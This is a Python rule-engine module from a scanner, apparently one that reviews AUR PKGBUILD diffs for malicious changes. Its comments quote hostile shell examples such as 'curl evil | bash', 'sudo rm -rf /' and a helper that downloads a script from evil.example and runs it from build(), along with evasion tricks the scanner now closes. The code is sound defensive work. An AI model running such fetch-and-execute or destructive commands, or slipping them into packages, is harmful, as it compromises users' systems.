import re
from functools import lru_cache
import threading
import logging

from .config import load_rules
from .findings import stamp
from .tokenizer import (  # noqa: F401
    collapse_traversal,
    strip_leading_bom,
    join_line_continuations,
    split_lines,
)
from .regex_safety import (
    BACKTRACK_BUDGET_S,
    backtracking_risk,
    has_nested_quantifier,
    is_superlinear,
)

_log = logging.getLogger(__name__)

# Lines starting with # after stripping + prefix are comments.
# Dependency declarations contain package names, not code; matching
# inside them produces false positives.  validpgpkeys is deliberately
# excluded: it is covered by rule H005 and must not be filtered out.
_COMMENT_OR_DEP_RE = re.compile(
    r"^(?:\+|)\s*(?:"
    r"#"
    r"|(?:depends|makedepends|optdepends|checkdepends)\s*=\s*\("
    r")"
)

# The dependency-declaration half of _COMMENT_OR_DEP_RE on its own: the
# rules that opt in via ``include_comments`` want prose - comments,
# descriptions, messages - not the package lists (a dependency name is not
# addressed to a reader).
_DEP_DECLARATION_RE = re.compile(
    r"^(?:\+|-|)\s*(?:depends|makedepends|optdepends|checkdepends)\s*=\s*\("
)

# Message strings (echo/printf/note arguments) are not execution contexts.
# Keywords appearing in them are false positives.
_MESSAGE_LINE_RE = re.compile(
    r'^(?:\+|)\s*(?:echo|printf|note|msg|warning|error|info)\s+["\']'
)

# ...but only when the line is *nothing but* that message.  A shell line
# does not end at its first command: `echo "x"; sudo rm -rf /` executes,
# and `echo "$(curl evil | bash)"` runs a command substitution inside the
# quotes.  Treating the whole line as inert let a seven-character prefix
# switch off every scoped rule, so any separator or substitution after
# the message keyword disqualifies the line from message context.
_COMMAND_CHAIN_RE = re.compile(r"[;&|]|\$\(|`")

def _has_unquoted_redirect(line: str) -> bool:
    """True when *line* redirects outside any quoted text.

    `echo "x" > file` writes a file rather than addressing a reader, which
    is the ordinary way a recipe appends a line to a system config. A `>`
    *inside* the quotes is punctuation: `echo "==> run sudo pacman -S qemu"`
    is the exact shape whose message classification keeps H017 and H035 off
    printed instructions, and searching the whole line for `>` put that
    false positive back on two benign packages.

    Written as a scan rather than a regex on purpose. The obvious pattern -
    `(?:"[^"]*"|'[^']*'|[^"'>])*>` - is a nested alternation that backtracks
    catastrophically when there is no redirect at all: 942 ms on a
    full-length line, which the regex audit refuses.
    """
    quote = ""
    for char in line:
        if quote:
            if char == quote:
                quote = ""
        elif char in "\"'":
            quote = char
        elif char == ">":
            return True
    return False

# Track function body boundaries for position-aware scoring.
#
# The name class is makepkg's, not Python's.  A split package declares
# `package_$pkgname()`, and a pkgname may hold `@ . _ + -`, so
# `package_google-chrome-bin() {` is an ordinary AUR shape.  `\w+` does not
# match a hyphen, so those headers matched *neither* expression: the
# function was never opened, its body classified as `other`, and every rule
# carrying a `function_body` or named scope skipped the whole region.
# Renaming `package` to `package_x-bin` was a one-word way out of them.
_FUNCTION_NAME_CLASS = r"[A-Za-z0-9_@.+][A-Za-z0-9_@.+-]*"
_FUNCTION_OPEN_RE = re.compile(rf"^\s*{_FUNCTION_NAME_CLASS}\s*\(\s*\)\s*\{{")
_FUNCTION_CLOSE_RE = re.compile(r"^\s*\}")

# Same shape, but capturing the name so a rule can scope itself to one
# function.  "curl in build()" is routine; "curl in pkgver()" is not, and
# a plain function_body scope cannot tell them apart.
_FUNCTION_NAME_RE = re.compile(rf"^({_FUNCTION_NAME_CLASS})\s*\(\s*\)\s*\{{")


def _starts_a_new_file(line: str, previous: str) -> bool:
    """True when *line* begins a new file's section of the diff.

    A hunk shows part of a file, not all of it, so a `package() {` whose
    closing brace falls outside the hunk leaves the brace counter raised.
    It used to stay raised for the remainder of the diff, which placed
    every *subsequent file* inside that function: in the benign corpus a
    `.desktop` file's translated `Name[be]=` lines and a README's Spanish
    prose were both classified as `package()` body and scanned as shell.
    They are the bulk of what the crossfire family fired on.

    ``diff --git`` is unambiguous.  The ``---``/``+++`` pair is accepted
    too, for diffs generated without it, but only as a pair: a removed
    source line reading ``-- x`` appears in a diff as ``--- x``, and
    treating that alone as a header would reset scope on package content.
    """
    if line.startswith("diff --git "):
        return True
    return line.startswith("+++ ") and previous.startswith("--- ")


# Compiled rule patterns, keyed by pattern text.  re's own cache is bounded
# at 512 entries and is shared with every other pattern the process compiles,
# so a corpus scan can evict rule patterns and recompile them per diff.  An
# invalid pattern is remembered as None so it is only reported once.
_pattern_cache: dict[str, "re.Pattern | None"] = {}

# Longest line handed to a rule pattern.  Rule patterns are ordinary
# regexes, some with alternation and optional groups, and the text they
# run on is written by the package under review; a line has no natural
# length limit once `join_line_continuations` has stitched a backslash
# chain together, so the input can reach the whole diff cap.  Matching
# cost that grows super-linearly in the input then becomes a denial of
# service that the package author chooses.  Bounding the *input* bounds
# every pattern at once, which no per-pattern audit can do.  8 KiB is far
# past any real PKGBUILD line, and a rule that matches only beyond it is
# matching something no reviewer would read either.
MAX_RULE_LINE_BYTES = 8192

#: Lines the rule engine will read from one diff.
#:
#: `MAX_RULE_LINE_BYTES` bounds how long a line may be; this bounds how many
#: there are, which was the missing half. Matching costs about 0.46 ms per
#: line, so the 5 MiB byte cap alone permitted ~1.3 million short lines and
#: roughly ten minutes of CPU for a single package - multiplied again by
#: `depth.MAX_DEPTH_NODES` on a full-depth run.
#:
#: 20,000 is five times the largest diff in the 3,246-diff locked benign
#: corpus (3,839 lines; p99.9 is 2,117), so it truncates nothing real while
#: holding the worst case near nine seconds.
MAX_SCANNED_LINES = 20_000


def clamp_diff_lines(diff_text: str, package_name: str = "") -> tuple[str, bool]:
    """Cut *diff_text* to :data:`MAX_SCANNED_LINES`, reporting whether it cut.

    A function rather than four lines inlined at each analysis entry point.
    The byte cap that sits next to this one was originally written on the
    git path alone, which left every other caller unbounded, and the same
    mistake is available here: `analyze_package` and `scan_diff` are
    parallel implementations that both tokenize and both match.
    """
    lines = diff_text.split("\n")
    if len(lines) <= MAX_SCANNED_LINES:
        return diff_text, False
    # Comments and blank lines are not content, and spending the budget on
    # them is the line-count twin of padding a single line with spaces:
    # 20,000 `# c` lines pushed a `curl … | bash` past the ceiling and
    # every pattern rule went blind together.
    #
    # They are still *emitted*, because dropping them would renumber every
    # line after them and the reported line number is evidence. What
    # changes is that they no longer count against the limit - and the
    # total is held at twice it, so the cost this cap exists to bound
    # stays bounded and a padder has to supply real content for at least
    # half of what it sends.
    kept: list[str] = []
    content = 0
    for line in lines:
        body = line[1:] if line[:1] in ("+", "-", " ") else line
        stripped = body.strip()
        if stripped and not stripped.startswith("#"):
            content += 1
        kept.append(line)
        if content >= MAX_SCANNED_LINES or len(kept) >= MAX_SCANNED_LINES * 2:
            break
    if len(kept) == len(lines):
        return diff_text, False
    _log.warning(
        "diff for %s holds %d lines; matching %d (%d with content)",
        package_name or "<unnamed>", len(lines), len(kept), content,
    )
    return "\n".join(kept), True


def _compiled(pattern: str):
    """Return the compiled form of *pattern*, or None if it is invalid."""
    try:
        return _pattern_cache[pattern]
    except KeyError:
        pass
    try:
        compiled = re.compile(pattern, re.IGNORECASE)
    except re.error:
        compiled = None
    if compiled is not None and (
        has_nested_quantifier(pattern)
        or backtracking_risk(compiled) > BACKTRACK_BUDGET_S
        # Growth as well as absolute cost: a quadratic pattern with a small
        # constant sits under the budget at the probe length and still
        # costs seconds at a full line.
        or is_superlinear(compiled)
    ):
        # Named, truncated: a refused pattern stops matching silently, and
        # "some rule died" is not something an operator can act on.
        # `trustsight lint` reports the same condition as an ERROR.
        _log.warning(
            "refusing regex pattern with excessive backtracking risk: %.80s",
            pattern,
        )
        compiled = None
    _pattern_cache[pattern] = compiled
    return compiled


#: Verdicts for dynamic patterns, kept so the answer is decided once.
#:
#: `backtracking_risk` *times* probe matches, so the verdict was both
#: expensive - the probes ran again on every call, for every finding - and
#: load-dependent: the same pattern could be accepted on an idle machine
#: and refused on a busy one, which makes the reported line number depend
#: on what else the box was doing. Caching per pattern fixes both: one
#: measurement, one answer, for the life of the process.
_dynamic_pattern_verdict: dict[str, bool] = {}


def _dynamic_pattern_is_unsafe(pattern: str, compiled: re.Pattern) -> bool:
    """True when *pattern* must be matched as literal text."""
    verdict = _dynamic_pattern_verdict.get(pattern)
    if verdict is None:
        verdict = bool(
            has_nested_quantifier(pattern)
            or backtracking_risk(compiled) > BACKTRACK_BUDGET_S
            or is_superlinear(compiled)
        )
        # Bounded: the callers pass rule-shaped fragments, but the cache
        # must not become a way for a long diff to grow memory.
        if len(_dynamic_pattern_verdict) < 4096:
            _dynamic_pattern_verdict[pattern] = verdict
    return verdict


def find_line_in_diff(
    diff_text: str, pattern: str, prefix: str = r"\+"
) -> int | None:
    r"""The 1-based line number of the first ``+``/``-`` line matching *pattern*.

    *pattern* is regex syntax on purpose: callers pass things like
    ``SKIP|NONE`` and ``sha256sums\s*=\s*\(``. Callers that mean a literal
    escape it first.

    The subtlety is what happens when escaping was forgotten, or when a
    caller forwards package text. This used to compile the pattern
    unescaped, fall back to escaping only on ``re.error``, and run whatever
    compiled against every line - so a string that is *valid* regex was
    executed as one, and this is the single place in the program where a
    pattern is built at runtime rather than audited by
    ``scripts/regex_audit.py``. A supplied ``(a+)+$`` cost 5.6 seconds
    against one 24-character line, doubling every two characters.

    So a dynamic pattern is held to the same standard as a shipped one: if
    it backtracks, it is treated as the literal text it probably was.
    """
    def _compile(body: str):
        return re.compile(r"^" + prefix + r".*" + body, re.IGNORECASE)

    try:
        compiled = _compile(pattern)
        if _dynamic_pattern_is_unsafe(pattern, compiled):
            _log.warning(
                "refusing dynamic line pattern with excessive backtracking "
                "risk; matching it literally instead"
            )
            compiled = _compile(re.escape(pattern))
    except re.error:
        # An escaped fragment sliced mid-escape leaves a trailing backslash.
        compiled = _compile(re.escape(pattern))

    for index, line in enumerate(split_lines(diff_text)):
        if compiled.search(line):
            return index + 1
    return None


#: Rules whose pattern is built at runtime rather than written in the TOML.
GENERATED_PATTERN_RULES = ("R013", "R047", "R048")


def resolve_generated_patterns(rules: list[dict]) -> list[dict]:
    """Fill in the patterns that are generated rather than declared.

    R013 is assembled from Unicode data and R047/R048 from config, so their
    TOML entries carry a placeholder and the real pattern only exists once
    this has run.

    A function rather than a loop inside `apply_rules` so that
    `scripts/regex_audit.py` can audit what actually runs. Those three
    patterns were invisible to all three of the audit's collection
    strategies at once: not a TOML literal, not `re.compile("literal")` in
    the source, and not a module-level `re.Pattern`. R013 is the FATAL
    homoglyph rule, and R047/R048 are built from operator config, so a
    config edit could have slowed the scan with no gate to catch it.
    """
    for rule in rules:
        if rule.get("id") == "R013":
            from .unicode import R013_UNCONDITIONAL_PATTERN
            rule["pattern"] = (
                R013_UNCONDITIONAL_PATTERN
                + r"|(?<![^\x00-\x7F])[\u200B-\u200F\uFEFF](?![^\x00-\x7F])"
            )
        elif rule.get("id") == "R047":
            from .config import _standard_port_pattern
            rule["pattern"] = _standard_port_pattern()
        elif rule.get("id") == "R048":
            from .config import _free_registrar_tld_pattern
            rule["pattern"] = _free_registrar_tld_pattern()
    return rules


#: Whitespace runs, collapsed before the clamp measures a line.
#:
#: The clamp bounds matching cost, which is why it cannot simply be raised
#: or replaced with sliding windows - the cost is the attacker's to choose
#: and bounding the input bounds every pattern at once. But it measured
#: *bytes*, and 8192 leading spaces are 8192 bytes of nothing: padding a
#: line so the command starts past the ceiling turned every pattern rule
#: off at once, R001 and the whole X-family together, leaving only the
#: `line_truncated` gap, which carries no weight.
#:
#: A shell ignores leading and repeated whitespace, so collapsing it before
#: measuring changes what no line means. It costs one linear pass and it
#: removes the cheapest way to buy space under the ceiling: padding must
#: now be made of real tokens, which a reader can see.
_WHITESPACE_RUN_RE = re.compile(r"[^\S\n]{2,}")


def clamp(line: str) -> str:
    """Truncate *line* to :data:`MAX_RULE_LINE_BYTES` for matching.

    Whitespace runs are collapsed first, so the budget is spent on content
    rather than on padding chosen to exhaust it.
    """
    if len(line) <= MAX_RULE_LINE_BYTES:
        return line
    line = _WHITESPACE_RUN_RE.sub(" ", line)
    return line if len(line) <= MAX_RULE_LINE_BYTES else line[:MAX_RULE_LINE_BYTES]


def clamp_text(text: str | None) -> str | None:
    """Apply :func:`clamp` to every line of *text*, keeping the line count.

    The rules in ``analysis/`` are regexes too, and there are more of them
    than there are in ``rules.toml``, but they match against the diff text
    directly rather than through :func:`apply_rules`, so the per-line clamp
    never reached them.  One 5 MiB line cost 0.17s through ``apply_rules``
    and 15s through the code-emitted rules, which is an attacker-chosen
    multiplier on how long a review takes.

    Lines are shortened, never dropped, so every index still refers to the
    line it did before and ``map_diff_lines`` keeps pointing at the right
    place.  Callers must measure ``coverage.oversized_lines`` on the
    *original* text first: after this, the evidence of truncation is gone,
    and a bound that drops content without recording it is exactly what
    the ``line_truncated`` gap exists to prevent.
    """
    if text is None:
        return None
    if len(text) <= MAX_RULE_LINE_BYTES:
        return text
    return "\n".join(clamp(line) for line in text.split("\n"))


def _to_pairs(lines: list[str]) -> list[tuple[int, str]]:
    """pair each line with its original index"""
    return [(i, clamp(line)) for i, line in enumerate(lines)]


def filter_raw_lines(lines: list[str]) -> list[tuple[int, str]]:
    """Remove comment lines and dependency declarations from raw diff lines.

    Returns (original_index, line) pairs so callers can map back to context.
    """
    return [
        (i, clamp(line)) for i, line in enumerate(lines)
        if not _COMMENT_OR_DEP_RE.match(line)
    ]


def _is_message_line(line: str) -> bool:
    """True when *line* is a message and nothing else."""
    return (
        bool(_MESSAGE_LINE_RE.match(line))
        and not _COMMAND_CHAIN_RE.search(line)
        and not _has_unquoted_redirect(line)
    )


def _inline_body(stripped: str) -> bool:
    """True when a function opens and carries code on the same line.

    ``package() { curl evil | bash; }`` is a function body, but the
    opening line used to be classified before the depth counter moved,
    so it read as ``other`` and escaped every ``function_body`` scope.
    """
    match = _FUNCTION_OPEN_RE.search(stripped)
    if not match:
        return False
    rest = stripped[match.end():].strip()
    return bool(rest) and rest != "}"


def _classify_line_context(lines: list[str]) -> dict[int, str]:
    """Return {line_index: context_name} for each line.

    Contexts: ``"function_body"``, ``"message"``, or ``"other"``.
    """
    contexts: dict[int, str] = {}
    depth = 0
    previous = ""
    for i, line in enumerate(lines):
        if _starts_a_new_file(line, previous):
            depth = 0
            contexts[i] = "other"
            previous = line
            continue
        previous = line
        stripped = line.lstrip("+").lstrip()
        if _is_message_line(line):
            contexts[i] = "message"
        elif depth > 0 or _inline_body(stripped):
            contexts[i] = "function_body"
        else:
            contexts[i] = "other"
        if _FUNCTION_OPEN_RE.search(stripped):
            depth += 1
            # Opened and closed on one line, so it must not leave the
            # counter raised for everything that follows.
            if stripped.rstrip().endswith("}"):
                depth -= 1
        elif _FUNCTION_CLOSE_RE.search(stripped):
            depth = max(0, depth - 1)
    return contexts


# Fifteen call sites in analysis/ classify the *same* lines, once each.
# The key is the content, not the object: each caller holds its own copy
# from tokenizer.resolve_added_lines, so identity never matches.  Hashing
# a few hundred short strings is far cheaper than re-running two regexes
# over every one of them, and Python caches a str's hash after the first
# use, so the second and later lookups are close to free.
# Thread-local, like the tokenizer memo: `review` analyses packages in a
# pool, and a shared dict would need the eviction sweep to be atomic with
# the insert.  It is not, and a KeyError inside a worker surfaces to the
# user as "this package was NOT vetted" - a correctness failure bought for
# a few microseconds of sharing.
_classify_memo = threading.local()
_CLASSIFY_ENTRIES = 4


def _classified(kind: str, lines: list[str], compute):
    cache = getattr(_classify_memo, "cache", None)
    if cache is None:
        cache = _classify_memo.__dict__.setdefault("cache", {})
    key = (kind, tuple(lines))
    hit = cache.get(key)
    if hit is None:
        hit = compute(lines)
        cache[key] = hit
        while len(cache) > _CLASSIFY_ENTRIES:
            del cache[next(iter(cache))]
    return dict(hit)


def _classify_enclosing_function(lines: list[str]) -> dict[int, str]:
    """Memoised wrapper: see :func:`_enclosing_function_map`."""
    return _classified("fn", lines, _enclosing_function_map)


def _enclosing_function_map(lines: list[str]) -> dict[int, str]:
    """Cached on the lines: the scope resolver asks once per rule family.

    A fresh dict is returned so a caller cannot mutate another's view.
    """
    return dict(_enclosing_function_map_cached(tuple(lines)))


@lru_cache(maxsize=8)
def _enclosing_function_map_cached(lines: tuple[str, ...]) -> dict[int, str]:
    """Return ``{line_index: enclosing_function_name}``.

    Lines outside any function are absent from the mapping.  A bare
    header line is not considered inside its own function, matching
    :func:`_classify_line_context`; a header that also carries code
    (``pkgver() { ...; }``) is, since that code really does run there.
    """
    enclosing: dict[int, str] = {}
    stack: list[str] = []
    previous = ""
    for i, line in enumerate(lines):
        if _starts_a_new_file(line, previous):
            stack.clear()
            previous = line
            continue
        previous = line
        stripped = line.lstrip("+").lstrip()
        match = _FUNCTION_NAME_RE.search(stripped)
        if stack:
            enclosing[i] = stack[-1]
        elif match and _inline_body(stripped):
            # Code sharing the line with its own `pkgver() {` header is
            # inside that function, so a scope naming it must match.
            enclosing[i] = match.group(1)
        if match:
            stack.append(match.group(1))
        elif _FUNCTION_OPEN_RE.search(stripped):
            stack.append("")
        if _FUNCTION_OPEN_RE.search(stripped):
            if stripped.rstrip().endswith("}") and stack:
                stack.pop()
        elif _FUNCTION_CLOSE_RE.search(stripped) and stack:
            stack.pop()
    return enclosing


def _function_bodies(lines: list[str]) -> dict[str, list[str]]:
    """Return ``{function_name: [body lines]}``, innermost owner wins."""
    bodies: dict[str, list[str]] = {}
    fn_map = _enclosing_function_map(lines)
    for index, name in fn_map.items():
        if name:
            bodies.setdefault(name, []).append(lines[index])
    return bodies


def _caller_closure_map(lines: list[str]) -> dict[str, frozenset[str]]:
    """Return ``{function_name: names that transitively call it}``.

    A named scope such as ``scope = ["pkgver"]`` asks "does this code run
    during pkgver?", but it was answered with "is this line lexically
    inside a function spelled pkgver?".  The reviewed party chooses the
    spelling, so the gate was theirs:

        _fetch() { curl -s "$url" | sed ...; }
        pkgver() { _fetch; }

    is network access in pkgver by any definition that matters, and R051
    did not see it.  Following the calls costs one pass and takes the
    naming decision back.
    """
    bodies = _function_bodies(lines)
    if len(bodies) < 2:
        return {}
    names = sorted(bodies, key=len, reverse=True)
    # A call is the name in command position: at the start of a command,
    # not an assignment to it and not the tail of a longer word or path.
    call_re = re.compile(
        r"(?:^|[;&|(){}`]|\$\(|\s)(" + "|".join(re.escape(n) for n in names)
        + r")(?=[\s;&|)}`]|$)"
    )
    calls: dict[str, set[str]] = {}
    for name, body in bodies.items():
        found = set()
        for line in body:
            stripped = line.lstrip("+").lstrip()
            for match in call_re.finditer(stripped):
                found.add(match.group(1))
        found.discard(name)
        calls[name] = found

    # Invert, then close over the inverted edges: pkgver -> _fetch means
    # _fetch's callers include pkgver, and anything reaching pkgver.
    callers: dict[str, set[str]] = {name: set() for name in bodies}
    for caller, callees in calls.items():
        for callee in callees:
            callers[callee].add(caller)
    for _ in range(len(bodies)):
        changed = False
        for name, direct in callers.items():
            grown = set(direct)
            for caller in direct:
                grown |= callers.get(caller, set())
            grown.discard(name)
            if grown != direct:
                callers[name] = grown
                changed = True
        if not changed:
            break
    return {name: frozenset(found) for name, found in callers.items() if found}


def _classify_caller_closure(lines: list[str]) -> dict[str, frozenset[str]]:
    """Memoised wrapper: see :func:`_caller_closure_map`."""
    return _classified("callers", lines, _caller_closure_map)


class ScopeResolver:
    """Which makepkg function's execution reaches a given diff line.

    Every code rule outside the config-driven set asked the same question -
    "is this line inside build/prepare/check/package?" - and answered it with
    the *direct* enclosing function.  The reviewed party writes the function
    names, so that answer was theirs to change:

        _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
        build()  { _fetch; bash "$srcdir/x.sh"; }

    ``_fetch`` is not in ``_CRITICAL_FUNCTIONS``, so H016 and H082 both stood
    down and a working fetch-and-execute scored as an ordinary download.
    R051 had already been given the call closure for its ``pkgver`` scope;
    this is the same closure, shared, so the remaining rules stop being
    evadable by declaring a function.

    *extra_lines* is the current PKGBUILD when the caller has it.  A diff
    shows a hunk, so the ``build()`` that calls the added helper may not be
    in it at all; the graph is built from the whole recipe where possible
    while findings still come only from added lines.
    """

    __slots__ = ("_fn", "_callers")

    def __init__(self, lines: list[str], extra_lines: list[str] | None = None):
        self._fn = _classify_enclosing_function(lines)
        graph_lines = lines if not extra_lines else list(lines) + list(extra_lines)
        self._callers = _classify_caller_closure(graph_lines)

    def direct(self, index: int) -> str | None:
        """The function a line is lexically inside, or None."""
        return self._fn.get(index)

    def within(self, index: int, names) -> str | None:
        """The name in *names* whose execution reaches *index*, or None.

        The direct enclosing function wins when it qualifies, so an
        unremarkable line in ``build()`` still reports ``build``.
        """
        enclosing = self._fn.get(index)
        if enclosing is None:
            return None
        if enclosing in names:
            return enclosing
        for caller in sorted(self._callers.get(enclosing, ())):
            if caller in names:
                return caller
        return None

    def label(self, index: int, names) -> str:
        """How to name the scope in a finding, without overstating it.

        A finding that says ``build()`` when the line is in ``_fetch()``
        sends the reader to the wrong place, so the indirection is named.
        """
        enclosing = self._fn.get(index)
        reached = self.within(index, names)
        if reached is None or enclosing is None or reached == enclosing:
            return reached or (enclosing or "")
        # Callers render this as `f"{label}()"`, so the trailing parens land
        # on the reached function and this one supplies its own.
        return f"{enclosing}(), called from {reached}"


def _scope_matches(
    scope: list[str],
    index: int,
    ctx_map: dict[int, str],
    fn_map: dict[int, str],
    caller_map: dict[str, frozenset[str]] | None = None,
) -> bool:
    """Check *index* against a rule's scope.

    A scope entry matches either a line context (``function_body``,
    ``message``, ``other``), the name of the enclosing function
    (``pkgver``, ``package``, ...), or the name of a function that
    transitively calls the enclosing one - a helper invoked from
    ``pkgver()`` runs during pkgver whatever it is called.
    """
    ctx = ctx_map.get(index, "other")
    if ctx in scope:
        return True
    enclosing = fn_map.get(index)
    if enclosing is None:
        return False
    if enclosing in scope:
        return True
    if not caller_map:
        return False
    return bool(caller_map.get(enclosing, frozenset()).intersection(scope))


def apply_rules(
    resolved_strings: list[str],
    raw_diff_lines: list[str],
    rules: list[dict] | None = None,
    include_experimental: bool = False,
    line_map: dict[int, tuple[str, int]] | None = None,
    resolved_indices: list[int] | None = None,
) -> list[dict]:
    """Match rules against diff lines and return triggered findings.

    *resolved_indices* maps each entry of *resolved_strings* back to its
    raw diff-line index (the third output of
    :func:`~trustsight.tokenizer.tokenize_and_resolve_indexed`).  Without
    it, resolved candidates are paired with their position in the resolved
    list, which is not a ``line_map`` key once assignment lines are
    omitted: resolved findings would carry no file/line (or, on a
    position collision, the wrong one).
    """
    if rules is None:
        rules = list(load_rules())
    resolve_generated_patterns(rules)

    triggered = []
    # Both maps are built from the unclamped lines: context classification
    # is structural (does this line open a function?) and must not shift
    # because a long line was truncated for matching.
    ctx_map = _classify_line_context(raw_diff_lines)
    fn_map = _classify_enclosing_function(raw_diff_lines)
    caller_map = _classify_caller_closure(raw_diff_lines)

    # These three candidate lists do not vary per rule, but used to be
    # rebuilt inside the loop: with ~75 rules that was 75 filtering passes
    # over every line of the diff.  Built once and shared, read-only.
    # `a/b/../c` is `a/c` once the kernel opens it, and a raw-line rule
    # anchored on `$pkgdir/etc/cron.d/` read the traversal spelling as a
    # path into `/lib`.  Collapsed here as well as in the resolved text,
    # because the rules that own package-root staging read raw lines
    # deliberately - they need the quoting the tokenizer removes.
    raw_candidates = [
        (i, collapse_traversal(strip_leading_bom(ln)))
        for i, ln in filter_raw_lines(raw_diff_lines)
    ]
    added_candidates = [(i, ln) for i, ln in raw_candidates if ln.startswith("+")]
    if resolved_indices is not None:
        resolved_candidates = [
            (idx, clamp(line))
            for idx, line in zip(resolved_indices, resolved_strings)
        ]
    else:
        resolved_candidates = _to_pairs(resolved_strings)

    # Comments are filtered for raw-line rules by `filter_raw_lines` and were
    # not filtered for resolved ones, so a resolved rule read commented-out
    # text as code: `# curl ... | bash` scored R001 CRITICAL and H016 HIGH,
    # a Critical band on a line that runs nothing.
    #
    # Two lists rather than one filtered list, because `include_comments` is
    # exactly the opt-out: R012's payload is aimed at whoever *reads* the
    # file and is a comment nearly every time, so that rule needs the
    # unfiltered text and everything else needs the code.
    resolved_code_candidates = [
        (idx, line) for idx, line in resolved_candidates
        if not _COMMENT_OR_DEP_RE.match(line)
    ]

    # Comments and plain declarations are filtered out (or never resolved)
    # for every other rule, because a commented-out command does not run and
    # a `pkgdesc=` string is not executed.  R012 and R013 are the exceptions:
    # their payload is aimed at whoever *reads* the file - a reviewer, or the
    # model summarising it - so what matters is every line the new revision
    # shows a reader.  Removals are excluded: text this diff deletes is text
    # the reader will not see.
    # The BOM strip applies here too: R013 is the rule that reads this list
    # and the rule a byte-order mark used to fire, at FATAL.
    reader_candidates = [
        (i, strip_leading_bom(ln)) for i, ln in _to_pairs(raw_diff_lines)
        if not ln.startswith("-") and not _DEP_DECLARATION_RE.match(ln)
    ]
    rules_by_id = {rule["id"]: rule for rule in rules}

    for rule in rules:
        if rule.get("enabled") is False:
            continue
        if rule.get("experimental") and not include_experimental:
            continue
        # H004 is a code rule (analysis/build.py).  A stale rules.toml from
        # before the migration would otherwise double-fire the regex form.
        if rule["id"] == "H004":
            continue

        match_target = rule.get("match_target", "raw_line")
        if match_target == "raw_line":
            candidates = (
                added_candidates if rule.get("added_only") else raw_candidates
            )
        else:
            candidates = resolved_code_candidates
        if rule.get("include_comments"):
            # For a raw-line rule the reader set *replaces* the default,
            # which drops the removed lines with it: a maintainer deleting a
            # hidden character must not score 100 for the cleanup.  For a
            # resolved rule it is additive - resolution still carries the
            # forms a variable hides.
            candidates = (
                reader_candidates if match_target == "raw_line"
                # The *unfiltered* resolved list here: a rule that opts into
                # comments must see them in the text resolution produced,
                # not only in the raw lines.
                else resolved_candidates + reader_candidates
            )

        compiled = _compiled(rule["pattern"])
        if compiled is None:
            continue

        rule_scope = rule.get("scope") if match_target == "raw_line" else None

        for idx, item in candidates:
            if compiled.search(item):
                if rule_scope and not _scope_matches(
                    rule_scope, idx, ctx_map, fn_map, caller_map
                ):
                    continue
                # A generic rule may defer to a more precise rule on the
                # same command.  This preserves one finding per operation
                # without making evaluation order part of the rule contract.
                if any(
                    (other := rules_by_id.get(other_id))
                    and other.get("enabled") is not False
                    and (not other.get("experimental") or include_experimental)
                    and other.get("match_target", "raw_line") == match_target
                    and (other_compiled := _compiled(other["pattern"]))
                    and other_compiled.search(item)
                    and (
                        not other.get("scope")
                        or _scope_matches(
                            other["scope"], idx, ctx_map, fn_map, caller_map
                        )
                    )
                    for other_id in rule.get("exclude_if_matches", [])
                ):
                    continue
                finding = {
                    "rule_id": rule["id"],
                    "name": rule["name"],
                    "severity": rule["severity"],
                    "category": rule["category"],
                    "match": item[:100],
                }
                if "weight_override" in rule:
                    finding["weight_override"] = rule["weight_override"]
                if line_map and idx in line_map:
                    finding["file"], finding["line"] = line_map[idx]
                triggered.append(stamp(finding, f"{rule['name']}: {{match}}"))
                break

    return triggered


def get_raw_diff_lines(diff_text: str) -> list[str]:
    """Return non-empty diff lines with continuations joined."""
    lines = []
    for line in join_line_continuations(split_lines(diff_text)):
        stripped = line.strip()
        if stripped:
            lines.append(stripped)
    return lines
